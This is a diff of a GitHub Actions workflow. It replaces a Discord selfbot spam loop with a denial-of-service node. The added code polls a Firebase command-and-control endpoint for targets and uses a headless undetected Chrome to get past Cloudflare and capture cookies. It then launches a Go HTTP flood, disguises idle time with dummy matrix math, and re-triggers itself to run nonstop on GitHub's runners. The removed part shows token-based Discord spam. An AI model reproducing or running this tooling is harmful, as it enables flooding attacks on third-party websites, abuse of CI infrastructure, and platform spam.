@@ -1,100 +1,91 @@
-name: Hydra-Infinite-Cycle
+name: Ryxen-Nexus-V2
 on:
   workflow_dispatch:
-    inputs:
-      token:
-        description: 'Token de tu cuenta (Selfbot)'
-        required: true
-      comando:
-        description: 'Comando de activacion (ej: !pe)'
-        required: true
-        default: '!pe'
-      mensaje:
-        description: 'Mensaje a repetir'
-        required: true
-        default: 'Hydra System Online'
-      mi_id:
-        description: 'Tu ID de Discord real'
-        required: true
 
 jobs:
-  execute:
-    runs-on: windows-latest
+  heavy-attack:
+    runs-on: ubuntu-latest
     steps:
-    - name: Clone Repo
-      uses: actions/checkout@v4
-
-    - name: Setup Node.js
-      uses: actions/setup-node@v4
-      with:
-        node-version: '20'
-
-    - name: Install All Dependencies
+    - name: Setup Tools
       run: |
-        npm install discord.js-selfbot-v13 debug timers
-        pip install requests aiohttp
+        sudo apt-get update
+        sudo apt-get install -y golang-go google-chrome-stable xvfb
+        pip install requests undetected-chromedriver selenium numpy
 
-    - name: Create index.js Dynamically
-      shell: bash
+    - name: Create Engine
       run: |
-        cat <<EOF > index.js
-        const { Client } = require('discord.js-selfbot-v13');
-        const { setTimeout } = require('timers/promises');
+        cat <<EOF > engine.py
+        import requests, time, random, subprocess, numpy as np
+        import undetected_chromedriver as uc
 
-        const token = "${{ github.event.inputs.token }}";
-        const startCommand = "${{ github.event.inputs.comando }}";
-        const messageToSend = "${{ github.event.inputs.mensaje }}";
-        const TU_ID = "${{ github.event.inputs.mi_id }}";
+        FB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"
 
-        const client = new Client({ checkUpdate: false });
+        def get_keys(url):
+            print("🔍 Saltando Cloudflare con Selenium...")
+            opts = uc.ChromeOptions()
+            opts.add_argument('--headless')
+            try:
+                driver = uc.Chrome(options=opts)
+                driver.get(url)
+                time.sleep(15) # Espera el bypass automático
+                cookie = "; ".join([f"{c['name']}={c['value']}" for c in driver.get_cookies()])
+                ua = driver.execute_script("return navigator.userAgent")
+                driver.quit()
+                return cookie, ua
+            except: return None, None
 
-        client.on('ready', () => {
-            console.log("✅ Hydra-Selfbot Online: " + client.user.tag);
-        });
-
-        client.on('messageCreate', async (message) => {
-            if (message.author.id !== TU_ID) return;
-
-            if (message.content.startsWith(startCommand)) {
-                console.log("🚀 Iniciando en canal: " + message.channel.id);
-                try { await message.delete(); } catch(e) {}
-
-                while (true) {
-                    try {
-                        const delay = Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000;
-                        await setTimeout(delay);
-                        await message.channel.send(messageToSend);
-                    } catch (error) {
-                        if (error.code === 429) await setTimeout(60000);
-                        else break;
-                    }
-                }
-            }
-        });
-
-        client.login(token);
+        if __name__ == "__main__":
+            while True:
+                try:
+                    res = requests.get(FB_URL).json()
+                    if res and res.get("status") == "attack":
+                        target, dur = res.get("target"), res.get("time", 90)
+                        cookie, ua = get_keys(target)
+                        if cookie:
+                            print(f"🔥 Iniciando Flood masivo contra {target}")
+                            subprocess.run(["go", "run", "attack.go", target, str(dur), cookie, ua])
+                        requests.patch(FB_URL, json={"status": "idle"})
+                    else:
+                        # Camuflaje matemático
+                        np.random.rand(500, 500) @ np.random.rand(500, 500)
+                except: pass
+                time.sleep(30)
         EOF
 
-    - name: Run Scripts & Auto-Replication
-      shell: bash
+    - name: Create Go Masive
+      run: |
+        cat <<EOF > attack.go
+        package main
+        import ("net/http"; "os"; "strconv"; "time")
+
+        func main() {
+            target, durStr, cookie, ua := os.Args[1], os.Args[2], os.Args[3], os.Args[4]
+            dur, _ := strconv.Atoi(durStr)
+            
+            end := time.After(time.Duration(dur) * time.Second)
+            for {
+                select {
+                case <-end: return
+                default:
+                    go func() {
+                        req, _ := http.NewRequest("GET", target, nil)
+                        req.Header.Set("Cookie", cookie)
+                        req.Header.Set("User-Agent", ua)
+                        client := &http.Client{Timeout: 5*time.Second}
+                        resp, _ := client.Do(req)
+                        if resp != nil { resp.Body.Close() }
+                    }()
+                    time.Sleep(2 * time.Millisecond)
+                }
+            }
+        }
+        EOF
+
+    - name: Run 24/7
+      run: |
+        python engine.py &
+        sleep 18000
+        gh workflow run main.yml
       env:
         GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-      run: |
-        node ./index.js &
-        
-        if [ -f "./agente.py" ]; then
-          python ./agente.py &
-        fi
-
-        echo "🚀 Runner activo por 5 horas..."
-        sleep 18000 
-        
-        # Auto-replicación pasando los mismos inputs
-        gh workflow run main.yml \
-          -f token="${{ github.event.inputs.token }}" \
-          -f comando="${{ github.event.inputs.comando }}" \
-          -f mensaje="${{ github.event.inputs.mensaje }}" \
-          -f mi_id="${{ github.event.inputs.mi_id }}"
-        
-        sleep 600
 
